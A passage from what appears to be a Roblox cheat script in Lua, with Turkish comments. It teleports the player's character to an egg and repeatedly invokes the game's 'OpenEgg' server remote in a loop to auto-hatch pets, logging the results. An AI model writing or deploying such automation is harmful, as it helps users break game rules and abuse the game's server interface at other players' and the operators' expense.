                lp.Character:PivotTo(eggModel:GetPivot() * CFrame.new(0, 0, 2))
            end
            
            -- ADIM 3: Auto Hatch
            _G.AutoHatch = true
            print("🚀 Sistem Aktif: " .. targetEggName .. " açılıyor!")

            task.spawn(function()
                while _G.AutoHatch do
                    local openRemote = getGameRemote("OpenEgg")
                    if openRemote then
                        HatchTickets = HatchTickets + openAmount
                        LastHatchRequestTime = tick()
                        EggsOpenedTotal = EggsOpenedTotal + openAmount
                        
                        local result = openRemote:InvokeServer(targetEggName, openAmount)
                        
                        if type(result) == "table" then
                            for _, p in pairs(result) do
                                if type(p) == "table" and (p.Name or p.id) then
                                    debugLog("📦 Pet Yakalandı: " .. tostring(p.Name or p.id))
                                end
                            end
                        end

                        if result == false then
                            openRemote:InvokeServer(targetEggName .. " Egg", openAmount)
                        end
                    end
                    task.wait(hatchSpeed)
                end
            end)
        else 
            warn("❌ Hedef yumurta bulunamadı!")
        end
